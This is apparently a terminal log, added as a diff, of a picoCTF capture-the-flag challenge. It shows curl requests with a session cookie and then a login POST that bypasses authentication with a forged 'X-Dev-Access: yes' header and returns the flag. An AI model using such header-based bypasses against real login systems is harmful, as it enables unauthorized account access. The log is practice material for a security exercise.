@@ -1,0 +1,19 @@
+──(white㉿white)-[~/white/Documents/htb]
+└─$ curl -b "session=mL_C8lzVGrqTt1qiyIqiRnH0YyEPDqQMGEB-a_vrIsg" http://dolphin-cove.picoctf.net:60115/
+curl: (7) Failed to connect to dolphin-cove.picoctf.net port 60115 after 477 ms: Could not connect to server
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ curl -b "session=mL_C8lzVGrqTt1qiyIqiRnH0YyEPDqQMGEB-a_vrIsg" http://dolphin-cove.picoctf.net:57876/
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ curl -X POST http://amiable-citadel.picoctf.net:56724/login \ 
+  -H "X-Dev-Access: yes" \
+  -H "Content-Type: application/x-www-form-urlencoded" \ 
+  --data "email=ctf-player@picoctf.org&password=anything"
+
+{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_7e5db33b}"}                                                                                                                           
